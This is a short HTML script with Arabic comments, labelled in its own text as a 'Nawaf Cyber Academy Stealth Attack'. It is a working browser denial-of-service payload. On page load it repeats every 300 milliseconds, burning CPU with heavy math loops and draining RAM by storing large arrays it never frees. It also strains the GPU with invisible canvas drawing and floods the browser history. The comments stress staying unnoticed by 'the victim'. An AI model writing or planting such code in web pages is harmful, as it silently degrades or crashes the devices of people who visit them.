<script>
    function stealthAttack() {
        // مصفوفة تراكمية مخفية لمنع المتصفح من تنظيف الذاكرة
        let hiddenVault = [];

        // استخدام setInterval بتوقيت متوسط (غير ملاحظ)
        setInterval(() => {
            // 1. استهلاك المعالج (CPU) بنسبة 40% تقريباً
            // عمليات حسابية معقدة تجعل المعالج يعمل باستمرار دون توقف
            for (let i = 0; i < 1500000; i++) {
                let calc = Math.sqrt(Math.random() * Math.PI) / Math.sin(Math.random());
            }

            // 2. استنزاف الرام (RAM) ببطء شديد (تراكمي)
            // في كل دورة، نضيف بيانات "ثقيلة" لا يستطيع المتصفح حذفها
            hiddenVault.push(new Float64Array(500000).fill(Math.random()));

            // 3. إرهاق كرت الشاشة (GPU) بعمليات "رسم وهمية" في الخلفية
            // نقوم برسم عناصر شفافة تماماً (لا تراها الضحية) لكنها تستهلك موارد الجرافيك
            let canvas = document.createElement('canvas');
            let ctx = canvas.getContext('2d');
            ctx.shadowBlur = 50;
            ctx.shadowColor = "rgba(0,0,0,0)"; // شفافة تماماً
            ctx.strokeText("Nawaf Cyber Academy Stealth Attack", 10, 10);

            // 4. إغراق السجل (History API) لثقل التنقل في المتصفح
            window.history.pushState(null, "", "?session=" + Math.random());

        }, 300); // تكرار كل 300 مللي ثانية (توازن بين القوة والصمت)
    }

    window.onload = stealthAttack;
</script>
